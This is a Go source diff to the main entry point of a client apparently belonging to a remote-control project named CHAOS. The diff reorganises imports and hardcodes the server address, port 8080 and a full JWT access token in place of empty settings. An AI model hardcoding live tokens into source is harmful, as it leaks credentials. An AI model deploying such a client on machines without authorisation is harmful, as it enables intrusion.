@@ -2,21 +2,26 @@ package main
 
 import (
 	"github.com/tiagorlampert/CHAOS/client/app"
-	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
+	"github.com/tiagorlampert/CHAOS/client/app/environment"
 	"github.com/tiagorlampert/CHAOS/client/app/ui"
-	"github.com/tiagorlampert/CHAOS/client/app/utilities/network"
 )
+
+//var (
+//	Version       = "dev"
+//	Port          = ""
+//	ServerAddress = ""
+//	Token         = ""
+//)
 
 var (
 	Version       = "dev"
-	ServerPort    = ""
-	ServerAddress = ""
-	Token         = ""
+	Port          = "8080"
+	ServerAddress = "localhost"
+	Token         = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRob3JpemVkIjp0cnVlLCJleHAiOjE2OTY2MjE4MDEsInVzZXIiOiJkZWZhdWx0In0.QotMkmtA9V5910-Xo0BdWizd5cM51xphR0bDMTqfCjw"
 )
 
 func main() {
-	ui.ShowMenu(Version, ServerAddress, ServerPort)
+	ui.ShowMenu(Version, ServerAddress, Port)
 
-	app.NewApp(network.NewHttpClient(10),
-		environment.Load(ServerAddress, ServerPort, Token)).Run()
+	app.New(environment.Load(ServerAddress, Port, Token)).Run()
 }
